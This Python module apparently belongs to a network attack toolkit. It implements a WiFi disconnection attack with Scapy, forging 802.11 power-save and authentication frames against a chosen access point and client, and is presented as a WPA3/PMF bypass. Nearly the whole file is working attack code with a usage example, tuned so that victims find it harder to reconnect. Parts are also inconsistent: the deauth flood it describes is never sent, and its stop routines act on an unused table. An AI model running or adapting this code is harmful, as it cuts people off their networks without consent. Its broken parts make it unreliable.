"""
network/deauth.py — 802.11 WiFi deauth flood via Scapy Dot11 layer.

Sends IEEE 802.11 deauthentication frames to disconnect WiFi clients
at the radio level — works even when ARP spoofing is ineffective
(e.g. client-isolation enabled, AP-side ARP snooping, etc.).

Requirements:
  • Wireless interface must support monitor mode
  • Interface must already be in monitor mode OR has iw available to switch
  • Run as root

Usage:
  deauth = DeauthManager(bssid="AA:BB:CC:DD:EE:FF", iface="wlan0mon")
  deauth.start_pmf_bypass(target_mac="11:22:33:44:55:66")
  deauth.stop_pmf_bypass(target_mac="11:22:33:44:55:66")
  deauth.stop_all()
"""
from __future__ import annotations

import shutil
import subprocess
import threading
import time
from scapy.all import (
    RadioTap, Dot11, Dot11Auth,
    sendp
)

try:
    SCAPY_WIFI_OK = True
except ImportError:
    SCAPY_WIFI_OK = False


class DeauthManager:
    DEAUTH_INTERVAL = 0.2    # seconds between deauth bursts (faster = harder to reconnect)
    BURST_COUNT     = 5      # frames per burst

    def __init__(self, bssid: str, iface: str):
        """
        bssid: Access Point MAC address
        iface: Monitor-mode interface (e.g. wlan0mon, wlan0)
        """
        self._bssid  = bssid
        self._iface  = iface
        self._lock   = threading.Lock()
        self._stops: dict[str, threading.Event] = {}   # mac → stop event
        self._targets: set[str] = set()
        self._running = False
        self._active = SCAPY_WIFI_OK and bool(bssid) and bool(iface)

    @staticmethod
    def _enable_monitor(iface: str) -> str:
        """
        Try to switch iface to monitor mode with iw.
        Returns the monitor interface name (may be same iface or 'ifacemon').
        """
        iw = shutil.which("iw")
        if not iw:
            return iface
        try:
            subprocess.run([iw, "dev", iface, "set", "monitor", "none"],
                           capture_output=True)
        except Exception:
            pass
        return iface

    def start_pmf_bypass(self, target_mac: str):
        """
        Advanced WPA3/PMF Deauth Bypass (CVE-2022-47522).
        1. Send Null Data packet with PM (Power Management) bit set to 1.
        2. AP thinks client is sleeping and starts buffering their traffic.
        3. Send a spoofed Auth frame (Open) to reset association.
        """
        if not self._iface or not self._bssid: return
        with self._lock: self._targets.add(target_mac)
        
        if not self._running:
            self._running = True
            threading.Thread(target=self._pmf_loop, daemon=True, name="pmf_bypass").start()

    def stop_pmf_bypass(self, target_mac: str):
        """Remove a target from the persistent PMF bypass loop."""
        with self._lock:
            self._targets.discard(target_mac)

    def _pmf_loop(self):
        while self._running:
            with self._lock: targets = list(self._targets)
            if not targets: break
            
            for target in targets:
                # Part 1: Power Save Trigger (FCfield 0x14 = PM bit set)
                # Tells AP: "I am client and I'm going to sleep, buffer my data"
                pkt_ps = (
                    RadioTap() /
                    Dot11(addr1=self._bssid, addr2=target, addr3=self._bssid, 
                          type=2, subtype=4, FCfield=0x14)
                )
                
                # Part 2: State Reset (Auth frame)
                # Causes AP to drop the session state for the client
                pkt_auth = (
                    RadioTap() /
                    Dot11(addr1=self._bssid, addr2=target, addr3=self._bssid) /
                    Dot11Auth(algo=0, seqnum=1, status=0)
                )
                
                try:
                    sendp(pkt_ps, iface=self._iface, verbose=False, count=5)
                    sendp(pkt_auth, iface=self._iface, verbose=False, count=5)
                except:
                    pass
            time.sleep(1)

    def stop(self, ip: str):
        with self._lock:
            evt = self._stops.pop(ip, None)
        if evt:
            evt.set()

    def stop_all(self):
        with self._lock:
            stops = list(self._stops.values())
            self._stops.clear()
            self._targets.clear()
        for evt in stops:
            evt.set()

    @property
    def is_available(self) -> bool:
        return self._active
